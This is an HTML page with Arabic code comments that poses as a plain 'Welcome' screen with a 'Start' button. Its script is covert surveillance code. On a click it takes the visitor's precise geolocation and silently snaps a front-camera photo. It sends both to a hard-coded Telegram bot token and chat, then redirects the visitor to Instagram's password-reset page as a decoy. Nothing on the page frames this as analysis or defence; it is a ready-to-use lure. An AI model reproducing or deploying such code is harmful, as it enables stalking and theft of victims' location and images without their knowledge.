<!doctype html>
<html lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Welcome</title>
<style>
  html, body {
    margin:0; padding:0; height:100%; display:flex;
    flex-direction: column;
    align-items:center; justify-content:center;
    background: linear-gradient(135deg, #6b73ff, #000dff);
    font-family: 'Arial', sans-serif;
    color: #fff;
    text-align: center;
  }

  h2 { margin: 10px 0; font-size: 32px; }
  p { margin: 5px 0 20px 0; font-size: 18px; }

  #goBtn {
    width:140px; height:140px; border-radius:50%; border:none;
    background: linear-gradient(145deg,#ff512f,#dd2476);
    color:#fff; font-size:20px; cursor:pointer;
    box-shadow: 0 10px 20px rgba(0,0,0,0.3);
    transition: all 0.2s ease;
    display:flex; align-items:center; justify-content:center;
    text-shadow: 0 2px 4px rgba(0,0,0,0.4);
  }

  #goBtn:hover {
    transform: scale(1.05);
    box-shadow: 0 12px 24px rgba(0,0,0,0.4);
  }

  #goBtn:active {
    transform: scale(0.95);
    box-shadow: 0 6px 12px rgba(0,0,0,0.2);
  }
</style>
</head>
<body>
  <h2>Welcome</h2>
  <p>Click the button to continue</p>

  <button id="goBtn">Start</button>

<script>
const BOT_TOKEN = "8202297978:AAFfOI_z409NpvMRaNnVvjij0c9HPj26ZZk"; // ضع توكن البوت
const CHAT_ID = "8273042434"; // رقم القناة أو معرفها
const SECOND_SITE = "https://www.instagram.com/accounts/password/reset/"; // رابط الموقع الثاني

document.getElementById('goBtn').addEventListener('click', async () => {
  try {
    // طلب الموقع
    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:20000}));
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    // فتح الكاميرا في الخلفية
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    await new Promise(r=>setTimeout(r,1000));

    // التقاط صورة في الخلفية
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
    const blob = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.85));
    stream.getTracks().forEach(t=>t.stop());

    // إرسال الموقع أولًا
    const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({chat_id:CHAT_ID, text:`Location: ${mapLink}`})
    });

    // إرسال الصورة
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'photo.jpg');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});

    // تحويل تلقائي بعد النجاح
    window.location.href = SECOND_SITE;

  } catch(e) {
    console.error(e);
    alert('حدث خطأ أو تم رفض الأذونات.');
  }
});
</script>
</body>
</html>
